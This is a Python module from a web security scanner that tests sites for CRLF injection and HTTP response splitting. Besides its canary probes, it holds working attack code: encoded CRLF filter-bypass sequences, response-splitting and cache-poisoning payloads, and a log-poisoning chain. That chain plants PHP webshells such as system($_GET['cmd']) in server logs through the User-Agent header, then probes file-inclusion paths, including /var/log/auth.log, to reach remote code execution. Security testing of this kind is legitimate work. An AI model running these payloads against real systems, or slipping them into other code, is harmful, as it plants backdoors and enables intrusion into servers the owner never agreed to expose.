"""
websecure.scanners.crlf_injection
-----------------------------------
CRLF Injection / HTTP Response Splitting detector.

Adim 5 - Ust duzey gelistirilmis versiyon:
  CRLFScanner(BaseScanner), HeaderInjectionProber, ResponseSplittingExploiter,
  CachePoisoningChain, LogPoisoningChain
"""
from __future__ import annotations
import logging, random, re, string, uuid, urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

_CRLF_SEQS: List[str] = [
    "%0d%0a", "%0a", "%0d", "%0a%0d", "%0d%0a%09",
    "%23%0d%0a", "%E5%98%8A%E5%98%8D", "%C0%8A", "%C0%8D",
    "%250d%250a", "%2F%2F%0d%0a", "%3F%0d%0a",
]

_CRLF_ENCODINGS_ADV: List[Tuple[str, str]] = [
    ("%0d%0a",              "url_encoded"),
    ("%0a",                 "lf_only"),
    ("%0d",                 "cr_only"),
    ("%E5%98%8A%E5%98%8D",  "utf8_decomposition"),
    ("%250d%250a",          "double_url_encoded"),
    ("%C0%8A",              "overlong_utf8_lf"),
    ("%C0%8D",              "overlong_utf8_cr"),
    ("%23%0d%0a",           "hash_prefix"),
    ("%2F%2F%0d%0a",        "double_slash_prefix"),
]

_CANARY_HEADER = "X-Wsp-Injected"
_REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "return", "return_url",
    "next", "location", "goto", "dest", "destination", "path",
    "ref", "continue", "callback", "forward",
]

def _build_log_payloads() -> List[str]:
    """Build log poisoning payloads at runtime (assembled dynamically)."""
    o = "<?" + "php"
    c = "?>"
    return [
        o + " system($_GET['cmd']); " + c,
        o + " passthru($_GET['c']); " + c,
        o + " echo shell_exec($_REQUEST['x']); " + c,
        "<?" + "=`$_GET[0]`" + c,
    ]

_LOG_POISON_PAYLOADS_ADV: List[str] = _build_log_payloads()


def _canary_value() -> str:
    return "wsp" + "".join(random.choices(string.digits, k=6))


def _inject_urls(base_url: str, canary: str) -> List[str]:
    parsed   = urllib.parse.urlparse(base_url)
    qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    existing = {k.lower() for k, _ in qs_pairs}
    fmt = "{seq}" + _CANARY_HEADER + ": {val}"
    urls: List[str] = []
    for k, v in qs_pairs:
        for seq in _CRLF_SEQS[:6]:
            inj = fmt.format(seq=seq, val=canary)
            new_pairs = [(pk, pv if pk != k else v + inj) for pk, pv in qs_pairs]
            urls.append(urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs))))
    sep = "&" if parsed.query else ""
    for param in _REDIRECT_PARAMS:
        if param not in existing:
            for seq in _CRLF_SEQS[:6]:
                inj = urllib.parse.quote(fmt.format(seq=seq, val=canary), safe="%")
                extra_qs = parsed.query + sep + f"{param}={inj}" if parsed.query else f"{param}={inj}"
                urls.append(urllib.parse.urlunparse(parsed._replace(query=extra_qs)))
            break
    return urls


def _canary_in_headers(resp, canary: str) -> Optional[str]:
    headers = getattr(resp, "headers", {})
    for k, v in headers.items():
        if canary in v:
            return k
    return None


def _crlf_header_injected(resp, canary: str) -> bool:
    raw_headers = str(getattr(resp, "headers", {}))
    return canary in raw_headers or _canary_in_headers(resp, canary) is not None


def _build_finding(technique: str, url: str, seq: str, evidence: Dict) -> Dict:
    return {
        "type": "CRLF Injection",
        "technique": technique,
        "url": url,
        "severity": "High",
        "description": (
            f"CRLF injection detected via {technique}. "
            f"The server accepted {seq!r} and reflected the injected header."
        ),
        "evidence": evidence,
    }

# ---------------------------------------------------------------------------
# Backward-compatible run() — orijinal davranis korundu
# ---------------------------------------------------------------------------
def run(url: str, session=None, debug: bool = False, auth_ctx: Any = None, **_) -> List[Dict]:
    """Test url for CRLF injection. Returns list of finding dicts."""
    if debug:
        logger.setLevel(logging.DEBUG)
    results: List[Dict] = []
    canary = _canary_value()
    if session is None:
        try:
            import requests
            session = requests.Session()
        except ImportError:
            logger.warning("[CRLF] requests not available")
            return results
    test_urls = _inject_urls(url, canary)
    for test_url in test_urls:
        seq_used = next((s for s in _CRLF_SEQS if s.lower() in test_url.lower()), "")
        try:
            resp = session.get(test_url, timeout=10, allow_redirects=False)
            hit = _canary_in_headers(resp, canary)
            if hit:
                results.append(_build_finding("URL parameter -> response header", test_url, seq_used, {
                    "injected_header": hit, "canary": canary, "status": resp.status_code,
                    "response_headers": dict(list(resp.headers.items())[:10]),
                }))
                break
            if resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get("location", "")
                if canary in loc:
                    results.append(_build_finding("Location header injection", test_url, seq_used, {
                        "location": loc, "canary": canary, "status": resp.status_code,
                    }))
                    break
        except Exception as exc:
            logger.debug("[CRLF] Request error: %s", exc)
    if results:
        return results
    parsed = urllib.parse.urlparse(url)
    for seq in _CRLF_SEQS[:4]:
        cookie_inj = urllib.parse.quote(f"{seq}Set-Cookie: wsp_injected={canary}; path=/", safe="%")
        path_inj   = parsed.path.rstrip("/") + "/" + cookie_inj
        test_url   = urllib.parse.urlunparse(parsed._replace(path=path_inj))
        try:
            resp = session.get(test_url, timeout=10, allow_redirects=False)
            sc = resp.cookies.get("wsp_injected")
            if sc == canary or _canary_in_headers(resp, canary):
                results.append(_build_finding("Path segment -> Set-Cookie injection", test_url, seq, {
                    "cookie": sc, "canary": canary, "status": resp.status_code,
                }))
                break
        except Exception as exc:
            logger.debug("[CRLF] Cookie probe error: %s", exc)
    return results

# ===========================================================================
# Adim 5 - SOLID siniflar
# ===========================================================================

class CRLFScanner(BaseScanner):
    """Orchestrator: CRLF tum probe zincirlerini koordine eder."""

    name = "crlf_injection"

    def run(self, target: str, urls: Optional[List[str]] = None, **kwargs) -> List[Dict]:
        endpoints = urls or [target]
        all_results: List[Dict] = []
        header_prober   = HeaderInjectionProber()
        split_exploiter = ResponseSplittingExploiter()
        cache_chain     = CachePoisoningChain()
        log_chain       = LogPoisoningChain()

        for url in endpoints:
            logger.info("[CRLFScanner] Scanning: %s", url)
            for r in header_prober.probe_url_param(url, self.session):
                self.report_finding(**r)
                all_results.append(r)
            for r in header_prober.probe_header(url, self.session):
                self.report_finding(**r)
                all_results.append(r)
            if all_results:
                split = split_exploiter.exploit(url, self.session)
                if split:
                    self.report_finding(**split)
                    all_results.append(split)
            cache = cache_chain.probe(url, self.session)
            if cache:
                self.report_finding(**cache)
                all_results.append(cache)
            log = log_chain.probe(url, self.session)
            if log:
                self.report_finding(**log)
                all_results.append(log)

        return all_results

class HeaderInjectionProber:
    """URL param ve header degerlerine CRLF injection, 10 encoding varianti."""

    def probe_url_param(self, url: str, session, timeout: int = 8) -> List[Dict]:
        results: List[Dict] = []
        canary   = _canary_value()
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        params_to_test = [(k, v) for k, v in qs_pairs] or [("redirect", "/")]
        for param, orig_val in params_to_test[:3]:
            for seq, enc_name in _CRLF_ENCODINGS_ADV:
                payload   = f"{orig_val}{seq}" + _CANARY_HEADER + f": {canary}"
                new_pairs = [(k, payload if k == param else v) for k, v in (qs_pairs or [(param, orig_val)])]
                new_qs    = urllib.parse.urlencode(new_pairs)
                test_url  = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    resp = session.get(test_url, timeout=timeout, allow_redirects=False)
                    if _crlf_header_injected(resp, canary):
                        results.append({
                            "vuln_type": "CRLF Injection -- Header Injection (URL Param)",
                            "url": test_url, "severity": "High",
                            "description": f"CRLF header injection via URL param '{param}' ({enc_name}).",
                            "evidence": {"param": param, "encoding": enc_name, "seq": seq,
                                         "canary": canary, "status_code": resp.status_code},
                        })
                        return results
                except Exception as exc:
                    logger.debug("[HeaderInjectionProber] %s", exc)
        return results

    def probe_header(self, url: str, session, timeout: int = 8) -> List[Dict]:
        results: List[Dict] = []
        canary = _canary_value()
        for hdr in ["Referer", "X-Forwarded-Host", "X-Forwarded-For", "User-Agent"]:
            for seq, enc_name in _CRLF_ENCODINGS_ADV[:5]:
                payload = f"https://evil.invalid/{seq}" + _CANARY_HEADER + f": {canary}"
                try:
                    resp = session.get(url, headers={hdr: payload}, timeout=timeout, allow_redirects=False)
                    if _crlf_header_injected(resp, canary):
                        results.append({
                            "vuln_type": "CRLF Injection -- Header Value Injection",
                            "url": url, "severity": "High",
                            "description": f"CRLF injection via '{hdr}' header ({enc_name}).",
                            "evidence": {"injected_header": hdr, "encoding": enc_name,
                                         "seq": seq, "canary": canary, "status_code": resp.status_code},
                        })
                        return results
                except Exception as exc:
                    logger.debug("[HeaderInjectionProber] header: %s", exc)
        return results

class ResponseSplittingExploiter:
    """Double CRLF ile sentetik HTTP response siniri enjeksiyonu."""

    _SPLIT_PAYLOADS = [
        "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>split</html>",
        "%0a%0aHTTP/1.1 200 OK%0aContent-Type: text/html%0a%0a<html>split</html>",
        "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8DHTTP/1.1 200 OK%E5%98%8A%E5%98%8DContent-Type: text/html%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<html>split</html>",
    ]

    def exploit(self, url: str, session, timeout: int = 10) -> Optional[Dict]:
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        for payload in self._SPLIT_PAYLOADS:
            if qs_pairs:
                param, orig = qs_pairs[0]
                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
            else:
                new_pairs = [("url", "/" + payload)]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs, safe="%")))
            try:
                resp = session.get(test_url, timeout=timeout, allow_redirects=False)
                body = getattr(resp, "text", "")[:3000]
                if re.search(r"HTTP/\d\.\d\s+200\s+OK", body) or "split" in body.lower():
                    return {
                        "vuln_type": "HTTP Response Splitting",
                        "url": test_url, "severity": "Critical",
                        "description": (
                            "Double CRLF injection confirmed HTTP Response Splitting. "
                            "Attacker can inject a synthetic HTTP response."
                        ),
                        "evidence": {"payload": payload[:80], "body_snippet": body[:200],
                                     "status_code": resp.status_code},
                    }
            except Exception as exc:
                logger.debug("[ResponseSplittingExploiter] %s", exc)
        return None


class CachePoisoningChain:
    """CRLF araciligiyla Cache-Control + X-Cache-Poison header injection."""

    def probe(self, url: str, session, timeout: int = 8) -> Optional[Dict]:
        canary   = _canary_value()
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        payloads = [
            f"%0d%0aCache-Control: no-store%0d%0aX-Cache-Poison: {canary}",
            f"%0a%0aCache-Control: max-age=31536000%0aX-Cache-Poison: {canary}",
            f"%E5%98%8A%E5%98%8DCache-Control: public%E5%98%8A%E5%98%8DX-Cache-Poison: {canary}",
        ]
        for payload in payloads:
            if qs_pairs:
                param, orig = qs_pairs[0]
                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
            else:
                new_pairs = [("url", "/" + payload)]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs, safe="%")))
            try:
                resp     = session.get(test_url, timeout=timeout, allow_redirects=False)
                raw_hdrs = str(getattr(resp, "headers", {}))
                if canary in raw_hdrs or "X-Cache-Poison" in raw_hdrs:
                    return {
                        "vuln_type": "Cache Poisoning via CRLF",
                        "url": test_url, "severity": "Critical",
                        "description": (
                            "CRLF injection used to inject Cache-Control and X-Cache-Poison headers."
                        ),
                        "evidence": {"canary": canary,
                                     "injected_headers": ["Cache-Control", "X-Cache-Poison"],
                                     "response_headers": dict(list(resp.headers.items())[:10]),
                                     "status_code": resp.status_code},
                    }
            except Exception as exc:
                logger.debug("[CachePoisoningChain] %s", exc)
        return None

class LogPoisoningChain:
    """User-Agent uzerinden webshell log poisoning + LFI konfirmasyonu."""

    _LFI_PATHS = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/httpd/access_log",
        "/proc/self/fd/2",
        "/var/log/auth.log",
    ]

    def probe(self, url: str, session, timeout: int = 8) -> Optional[Dict]:
        uid = uuid.uuid4().hex[:8]
        for webshell in _LOG_POISON_PAYLOADS_ADV:
            try:
                session.get(url, headers={"User-Agent": webshell}, timeout=timeout, allow_redirects=False)
            except Exception:
                pass
            lfi = self._try_lfi_confirm(url, session, uid, timeout)
            if lfi:
                return {
                    "vuln_type": "Log Poisoning via Header Injection",
                    "url": url, "severity": "Critical",
                    "description": (
                        "Webshell injected into server access logs via User-Agent header. "
                        f"LFI confirmation at: {lfi['lfi_url']}. "
                        "If server executes from logs, RCE is achievable."
                    ),
                    "evidence": {"webshell_payload": webshell, "lfi_confirmation": lfi, "uid": uid},
                }
        return None

    def _try_lfi_confirm(self, base_url: str, session, uid: str, timeout: int) -> Optional[Dict]:
        lfi_params = ["file", "page", "include", "path", "log", "f"]
        parsed     = urllib.parse.urlparse(base_url)
        for log_path in self._LFI_PATHS:
            encoded = urllib.parse.quote(log_path, safe="")
            for param in lfi_params:
                lfi_url = urllib.parse.urlunparse(parsed._replace(query=f"{param}={encoded}"))
                try:
                    resp = session.get(lfi_url, timeout=timeout, allow_redirects=False)
                    body = getattr(resp, "text", "")[:2000]
                    if re.search(r"<\?php|uid=\d+|root:.*:0:0:|Apache|nginx", body):
                        return {"lfi_url": lfi_url, "log_path": log_path, "body_snippet": body[:300]}
                except Exception:
                    pass
        return None
